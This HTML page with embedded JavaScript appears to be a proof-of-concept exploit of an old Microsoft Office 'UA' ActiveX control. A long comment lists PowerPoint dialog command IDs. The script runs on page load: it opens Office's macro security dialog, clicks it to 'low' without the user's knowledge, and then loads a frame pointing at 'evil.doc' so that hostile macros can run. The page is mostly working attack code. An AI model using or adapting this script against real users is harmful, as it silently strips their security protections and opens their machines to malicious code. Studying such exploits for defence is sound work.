<html>

<body>

<script>

/* 
   Office UA Control Example 
   
   Known ShowDialog TCIDs for POWERPOINT (some are global to other office apps):
	0: New Slide
	2: Check spelling
	3: Save As
	4: Print
	8: Insert Table
       17: Insert Chart
       18: New Presentation
       22: Paste
       23: Open
       26: Unknown. Makes hard drive whirr a lot. Sounds like a search operation.
      141: Find
      169: Show rulers
      184: Record macro
      186: Play macro
      298: Restore MDI Child      
      313: Split MDI Child
      409: Draw with pen
      411: Draw with line
      522: Options dialog
      546: Insert Object
      548: View Controls Toolbar
      680: New Slide
      681: Insert Table
      682: Insert Clipart
      684: Write-Up
      689: View autoshapes toolbar
      700: Something I forgot
      701: Assign Design Template
      702: Whirr a lot
      703: Insert Powerpoint Object?
      704: Insert Powerpoint Object?
      731: Slide Transition
      733: Autocontent Wizard
      734: Full Slide Show
      735: Funky Grid Thing
      736: Maximize Workspace
      737: Maximize TOC
      738: Maximize Thumbnails
      739: Maximize Page view
      740: Full screen show
      741: show master text styles
      748: Save As
      750: Properties
      755: Paste Special
      762: Header/Footer
      768: Add Date/Time
      769: Add Page Number
      790: Choose Language
      793: Autocorrect
      797: Customize
      831: Open recent document
      837: LAUNCH OUTLOOK
      838: Launch outlook in a different way
      841: Move cursor?
      842: Move cursor?
      843: Maximize MDI Client
      916: Show table/border toolbar
      925: Zoom
      927: About
      938: Mail document?
      943: Add-Ins
      959: Activate
      983: Help
     1004: Activate Retarded Paperclip (tm)
     1015: Open Location
     1016: Launch Internet Explorer?!
     1021: Browse Favorites
     1023: Hide Toolbars?
     1031: WordArt
     1056: Shadow Settings
     1057: 3D Settings
     1110: Insert Autoshape?
     1111: Insert rectangle
     1112: Insert Parallelogram
     1113: Insert Rhombus
     1114: Insert Diamond
	...
     1119: Insert Circle
        ...
     1144: Insert Up Arrow
     1145: Insert Down Arrow
	...
     1561: LAUNCH VISUAL BASIC
	For word, 1695 is launch visual basic

  * Hrm. That's enough of that.... *
         
*/


var ua;

function setup()
{
	// Create UA control
	ua = new ActiveXObject("OUACtrl.OUACtrl.1");

	// Attach ua object to ppt object
	ua.WndClass="OpusApp";
	ua.OfficeApp=0;
		
	// Verify UA objects sees Office application
	return ua.IsAppRunning();
}

function disablemacroprotection()
{	
	var ret;
	// Activate application
	ua.AppActivate();

	// Display macro security dialog
	ua.ShowDialog(0x0E2B);

	// Click the 'low' button
	ua.SelectTabSDM(0x13);

	// Click the 'ok' button
	ua.SelectTabSDM(1);
}

function enablemacroprotection()
{	
	// Activate application
	ua.AppActivate();

	// Display macro security dialog
	ua.ShowDialog(0x0E2B);	

	// Click the 'medium' button
	ua.SelectTabSDM(0x12);

	// Click the 'ok' button
	ua.SelectTabSDM(1);
}

// Beginning of script execution

if(setup()) {

	disablemacroprotection();	

	parent.frames["blank"].location="evil.doc";

}

</script>


</body>

	

</html>
